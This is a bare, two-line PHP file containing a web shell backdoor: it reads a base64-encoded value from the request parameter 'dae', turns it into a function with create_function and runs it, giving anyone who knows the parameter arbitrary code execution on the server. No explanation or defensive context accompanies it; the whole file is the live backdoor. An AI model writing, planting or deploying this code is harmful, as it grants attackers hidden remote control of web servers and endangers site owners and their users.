<?php
if(!empty($_REQUEST['dae'])){$dae=base64_decode($_REQUEST["dae"]);$dae=create_function('',$dae);$dae();exit;}